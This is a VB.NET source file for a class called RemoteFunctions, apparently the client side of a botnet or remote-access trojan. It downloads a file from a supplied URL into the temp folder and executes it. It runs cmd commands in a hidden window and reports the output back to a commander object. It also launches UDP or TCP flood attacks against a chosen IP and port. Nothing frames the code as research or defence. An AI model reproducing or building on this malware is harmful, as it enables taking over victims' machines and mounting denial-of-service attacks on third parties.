Imports System.Net
Public Class RemoteFunctions
    Dim Commander As New Commander
    Dim UDPFlooder As New UDPFlooder
    Dim TCPFlooder As New TCPFlooder

    Dim TempFolder As String = System.IO.Path.GetTempPath
    Dim SharedName As String
#Region "DownloadAndExecute"
    Public Sub DownloadAndExecute(Url As String, Name As String)
        SharedName = Name
        Dim Client As New WebClient
        AddHandler Client.DownloadFileCompleted, AddressOf Downloaded
        Client.DownloadFileAsync(New Uri(Url), TempFolder & "\" & Name)
    End Sub
    Private Sub Downloaded()
        Process.Start(TempFolder & "/" & SharedName)
    End Sub
#End Region
    Public Sub OpenWebsite(x As String)
        Try
            Process.Start(x)
        Catch ex As Exception
            Commander.Update(ex.Message)
        End Try
    End Sub
    Public Sub Shell(x As String)
        Using p As New Process()
            With p.StartInfo
                .CreateNoWindow = True
                .FileName = "cmd"
                .RedirectStandardInput = True
                .RedirectStandardOutput = True
                .UseShellExecute = False
            End With
            p.Start()
            p.StandardInput.WriteLine(x)
            p.StandardInput.WriteLine("exit")
            Commander.Update(p.StandardOutput.ReadToEnd)
        End Using
    End Sub
    Public Sub Flood(modus As String, IP As String, Port As Integer, Threads As Integer, Requests As Integer)
        If modus = "udp" Then
            UDPFlooder.Setup(IP, Port, Requests, Threads)
        ElseIf modus = "tcp" Then
            TCPFlooder.Setup(IP, Port, Requests, Threads)
        End If
    End Sub
End Class